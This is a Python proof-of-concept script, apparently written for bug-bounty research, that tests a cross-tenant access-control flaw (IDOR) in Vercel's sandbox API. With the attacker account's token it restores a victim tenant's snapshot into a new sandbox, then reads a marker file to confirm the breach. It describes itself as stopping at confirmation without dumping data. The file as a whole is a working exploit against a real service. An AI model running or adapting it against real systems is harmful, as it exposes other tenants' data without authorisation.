# -*- coding: utf-8 -*-
"""attacker 侧: 跨租户快照 IDOR 测试 (stop at confirmation)
用主账号(attacker) 的 token 尝试以 victim2 的快照 ID 创建/恢复沙箱
若沙箱成功创建且文件系统含 victim 的 marker -> 跨租户快照恢复 = Broken Access Control
用法: python atk_snap_idor.py <victim_snapshot_id> <victim_marker>
"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

SNAP = sys.argv[1]
MARKER = sys.argv[2]
NAME = 'atk_snapx'

print('=== 1) attacker 用 victim 快照创建沙箱 (POST source=snapshot) ===', flush=True)
api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
time.sleep(2)
c, r = api('POST', '/v2/sandboxes?teamId=%s' % TEAM,
           {'projectId': PROJ, 'name': NAME,
            'source': {'type': 'snapshot', 'snapshotId': SNAP}})
print('create:', c, r[:600], flush=True)

if c != 200:
    print('SAFE: create rejected (%d)' % c, flush=True)
    sys.exit(0)

d = json.loads(r)
sid = d['sandbox']['currentSessionId']
print('ATK_SID:', sid, flush=True)
print('currentSnapshotId:', d.get('sandbox', {}).get('currentSnapshotId'), flush=True)
time.sleep(3)

# 检查 marker (stop at confirmation: 只查 marker, 不 dump)
c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
           {'command': 'cat', 'args': ['/vercel/sandbox/tenant_marker.txt'],
            'wait': True, 'timeout': 30000})
print('marker check:', c, r[:500], flush=True)
if c == 200 and MARKER in r:
    print('CONFIRMED: attacker restored victim snapshot, marker present!', flush=True)
else:
    print('marker NOT found in attacker sandbox', flush=True)

print('=== DONE ===', flush=True)
